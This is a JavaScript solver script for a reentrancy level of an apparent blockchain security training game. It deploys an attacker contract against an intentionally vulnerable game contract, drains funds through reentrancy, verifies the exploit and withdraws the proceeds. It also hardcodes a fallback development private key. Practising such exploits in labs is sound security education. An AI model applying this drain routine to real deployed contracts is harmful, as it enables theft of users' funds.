// Level4ReentrancyLabyrinth Solver Script
const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

// Import contract artifacts using require
const ReentrancyAttackerArtifact = require('../artifacts/contracts/ReentrancyAttacker.sol/ReentrancyAttacker.json');

async function main() {
    try {
        // Import addresses dynamically since it's an ESM module
        const { contractAddresses } = await import('../frontend/src/config/addresses.js');

        console.log("🔐 BLOCKCHAIN GUARDIAN: LEVEL 4 REENTRANCY LABYRINTH 🔐");
        console.log("=======================================================");

        // Connect to network
        const provider = new ethers.JsonRpcProvider(process.env.RPC_URL || 'http://localhost:8545');
        const wallet = new ethers.Wallet(process.env.HT_PRIVATE_KEY || "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", provider);
        const walletAddress = wallet.address;

        console.log(`Using wallet address: ${walletAddress}`);

        // Validate and format contract addresses
        const LEVEL4_CONTRACT_ADDRESS = ethers.getAddress(process.env.LEVEL4_CONTRACT_ADDRESS || contractAddresses.Level4ReentrancyLabyrinth);
        const GAME_CONTRACT_ADDRESS = ethers.getAddress(process.env.GAME_CONTRACT_ADDRESS || contractAddresses.BlockchainGuardianGame);

        if (!ethers.isAddress(LEVEL4_CONTRACT_ADDRESS) || !ethers.isAddress(GAME_CONTRACT_ADDRESS)) {
            throw new Error("Invalid contract addresses");
        }

        console.log(`Level4 Contract: ${LEVEL4_CONTRACT_ADDRESS}`);
        console.log(`Game Contract: ${GAME_CONTRACT_ADDRESS}`);

        // Contract ABIs
        const level4Abi = [
            "function deposit() external payable",
            "function vulnerableWithdraw(uint256 amount) external",
            "function checkExploit(address solution) external",
            "function secureWithdraw(uint256 amount) external",
            "function validateSolution() external",
            "function balances(address) external view returns (uint256)",
            "function totalDeposits() external view returns (uint256)",
            "function exploitSuccessful() external view returns (bool)"
        ];

        const gameAbi = [
            "function playerLevel(address player) view returns (uint256)"
        ];

        // Create contract instances with proper address validation
        const level4Contract = new ethers.Contract(
            LEVEL4_CONTRACT_ADDRESS,
            level4Abi,
            wallet
        );

        const gameContract = new ethers.Contract(
            GAME_CONTRACT_ADDRESS,
            gameAbi,
            wallet
        );

        // Check current player level
        const initialLevel = await gameContract.playerLevel(walletAddress);
        console.log(`Current player level: ${initialLevel}`);

        if (Number(initialLevel) >= 4) {
            console.log("You've already completed Level 4!");
            return;
        }

        // Step 1: Check initial contract state
        await printContractState(level4Contract, walletAddress, provider);

        // Step 2: Deploy the ReentrancyAttacker contract
        console.log("\n🚀 Deploying ReentrancyAttacker contract...");
        const attackerFactory = new ethers.ContractFactory(
            ReentrancyAttackerArtifact.abi,
            ReentrancyAttackerArtifact.bytecode,
            wallet
        );

        const attackerContract = await attackerFactory.deploy(LEVEL4_CONTRACT_ADDRESS);
        await attackerContract.waitForDeployment();
        console.log(`✅ ReentrancyAttacker deployed at: ${attackerContract.target}`);

        console.log("\n🧪 Testing attacker contract functions...");

        // Test 1: Check target address
        const targetAddress = await attackerContract.getFunction('target')();
        console.log(`Target address: ${targetAddress}`);

        // Test 2: Check owner
        const owner = await attackerContract.owner();
        console.log(`Contract owner: ${owner}`);

        // Test 3: Check initial deposit
        const initialDeposit = await attackerContract.initialDeposit();
        console.log(`Initial deposit: ${ethers.formatEther(initialDeposit)} ETH`);

        // Test 4: Setup with some ETH
        console.log("\nTesting setup function...");
        try {
            const setupAmount = ethers.parseEther("0.1");
            const setupTx = await attackerContract.setup({ value: setupAmount });
            await setupTx.wait();
            console.log(`✅ Setup successful with ${ethers.formatEther(setupAmount)} ETH`);

            // Check contract balance after setup
            const balance = await provider.getBalance(attackerContract.target);
            console.log(`Contract balance after setup: ${ethers.formatEther(balance)} ETH`);
        } catch (error) {
            console.error(`❌ Setup failed: ${error.message}`);
        }

        // Test 5: Try withdraw function
        console.log("\nTesting withdraw function...");
        try {
            const withdrawTx = await attackerContract.withdraw();
            await withdrawTx.wait();
            console.log("✅ Withdraw successful");
        } catch (error) {
            console.error(`❌ Withdraw failed: ${error.message}`);
        }

        // Step 3: Setup the attack
        console.log("\n🔧 Setting up the attack...");
        const initialDepositForAttack = ethers.parseEther("0.1");  // 0.1 ETH
        const setupTxForAttack = await attackerContract.setup({ value: initialDepositForAttack });
        await setupTxForAttack.wait();
        console.log(`✅ Deposited ${ethers.formatEther(initialDepositForAttack)} ETH into the vulnerable contract`);

        // Step 4: Check state after setup
        await printContractState(level4Contract, walletAddress, provider, attackerContract.address);

        // Step 5: Execute the exploit
        console.log("\n⚔️ Executing reentrancy attack...");
        try {
            const attackerBalance = await level4Contract.balances(attackerContract.target);
            console.log(`Attacker balance before exploit: ${ethers.formatEther(attackerBalance)} ETH`);

            if (attackerBalance === 0n) {
                console.error("❌ No balance to exploit. Make sure setup deposited funds correctly.");
                return;
            }

            const contractBalanceBefore = await provider.getBalance(level4Contract.target);
            console.log(`Contract balance before exploit: ${ethers.formatEther(contractBalanceBefore)} ETH`);

            // Execute exploit with higher gas limit
            const exploitTx = await attackerContract.exploit({
                gasLimit: 5000000,
                maxFeePerGas: ethers.parseUnits("100", "gwei"),
                maxPriorityFeePerGas: ethers.parseUnits("50", "gwei")
            });

            console.log("Exploit transaction sent, waiting for confirmation...");
            const receipt = await exploitTx.wait();

            // Check balances after exploit
            const contractBalanceAfter = await provider.getBalance(level4Contract.target);
            const attackerBalanceAfter = await level4Contract.balances(attackerContract.target);

            console.log("\nPost-exploit state:");
            console.log(`Contract balance after: ${ethers.formatEther(contractBalanceAfter)} ETH`);
            console.log(`Attacker balance after: ${ethers.formatEther(attackerBalanceAfter)} ETH`);
            console.log(`Gas used: ${receipt.gasUsed}`);

            if (contractBalanceAfter < contractBalanceBefore) {
                console.log("✅ Exploit successful - contract balance reduced!");
            } else {
                console.log("⚠️ Warning: Contract balance unchanged");
            }

        } catch (error) {
            console.error(`❌ Exploit failed: ${error.message}`);
            if (error.reason) console.error(`Reason: ${error.reason}`);
        }

        // Step 6: Check state after exploit
        await printContractState(level4Contract, walletAddress, provider, attackerContract.address);

        // Step 7: Verify exploit in the contract
        console.log("\n🔍 Verifying the exploit...");
        try {
            // First check if exploit was successful directly
            const exploitStatus = await level4Contract.exploitSuccessful();
            console.log(`Current exploit status: ${exploitStatus}`);

            // Get contract balances before verification
            const contractBalance = await provider.getBalance(level4Contract.target);
            const attackerBalance = await level4Contract.balances(attackerContract.target);
            
            console.log("\nPre-verification state:");
            console.log(`Contract balance: ${ethers.formatEther(contractBalance)} ETH`);
            console.log(`Attacker balance in contract: ${ethers.formatEther(attackerBalance)} ETH`);

            // Try verification with higher gas and proper error handling
            const verifyTx = await level4Contract.checkExploit(
                attackerContract.target,
                {
                    gasLimit: 10000000,
                    maxFeePerGas: ethers.parseUnits("1000", "gwei"),
                    maxPriorityFeePerGas: ethers.parseUnits("500", "gwei")
                }
            );

            console.log("\nVerification transaction sent...");
            const receipt = await verifyTx.wait();
            
            // Check post-verification state
            const postExploitStatus = await level4Contract.exploitSuccessful();
            console.log(`\nPost-verification state:`);
            console.log(`Exploit status: ${postExploitStatus}`);
            console.log(`Gas used: ${receipt.gasUsed}`);

            if (postExploitStatus) {
                console.log("✅ Exploit verified successfully!");
            } else {
                throw new Error("Exploit verification succeeded but status is still false");
            }
        } catch (error) {
            console.error(`\n❌ Exploit verification failed:`);
            console.error(`Error message: ${error.message}`);
            if (error.reason) console.error(`Reason: ${error.reason}`);
            
            // Log transaction details if available
            if (error.transaction) {
                console.error("\nTransaction details:");
                console.error(`To: ${error.transaction.to}`);
                console.error(`From: ${error.transaction.from}`);
                console.error(`Data: ${error.transaction.data}`);
            }
            
            return;
        }

        // Step 8: Complete the level
        console.log("\n🏁 Completing the level...");
        try {
            const completeTx = await attackerContract.completeLevel();
            await completeTx.wait();
            console.log("✅ Level completion transaction sent successfully!");
        } catch (error) {
            console.error(`❌ Level completion failed: ${error.message}`);
            return;
        }

        // Step 9: Check final state
        await printContractState(level4Contract, walletAddress, provider, attackerContract.address);

        // Step 10: Withdraw ETH from attacker contract
        console.log("\n💰 Withdrawing ETH from attacker contract...");
        try {
            const withdrawTx = await attackerContract.withdraw();
            await withdrawTx.wait();
            console.log("✅ Funds withdrawn successfully from attacker contract!");
        } catch (error) {
            console.error(`❌ Withdrawal failed: ${error.message}`);
        }

        // Step 11: Check if level completed
        const playerLevel = await gameContract.playerLevel(walletAddress);
        console.log(`\nPlayer level after attempts: ${playerLevel}`);

        if (Number(playerLevel) >= 4) {
            console.log("\n🎮 LEVEL 4 COMPLETED SUCCESSFULLY! 🎮");
        } else {
            console.log("\n❌ Level not completed. Please check your approach.");
        }

    } catch (error) {
        console.error(`\n❌ Script failed: ${error.message}`);
        if (error.reason) console.error(`Reason: ${error.reason}`);
        process.exit(1);
    }
}

// Helper function to print contract state
async function printContractState(level4Contract, walletAddress, provider, attackerAddress = null) {
    console.log("\n📊 Current Contract State:");
    console.log("------------------------");
    // console.log(level4Contract.target);
    // Get contract balance
    const contractBalance = await provider.getBalance(level4Contract.target);
    console.log(contractBalance);
    console.log(`Contract balance: ${ethers.formatEther(contractBalance)} ETH`);

    // Get total deposits
    const totalDeposits = await level4Contract.totalDeposits();
    console.log(`Total deposits: ${ethers.formatEther(totalDeposits)} ETH`);

    // Get user balance in contract
    const userBalance = await level4Contract.balances(walletAddress);
    console.log(`Your balance in contract: ${ethers.formatEther(userBalance)} ETH`);

    // Get wallet balance
    const walletBalance = await provider.getBalance(walletAddress);
    console.log(`Your wallet balance: ${ethers.formatEther(walletBalance)} ETH`);

    // Get exploit status
    const exploitSuccessful = await level4Contract.exploitSuccessful();
    console.log(`Exploit successful: ${exploitSuccessful}`);

    // If attacker contract is deployed, show its balances
    if (attackerAddress) {
        const attackerContractBalance = await provider.getBalance(attackerAddress);
        console.log(`Attacker contract balance: ${ethers.formatEther(attackerContractBalance)} ETH`);

        const attackerInContractBalance = await level4Contract.balances(attackerAddress);
        console.log(`Attacker balance in vulnerable contract: ${ethers.formatEther(attackerInContractBalance)} ETH`);
    }

    console.log("------------------------");
}

// Execute the main function
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });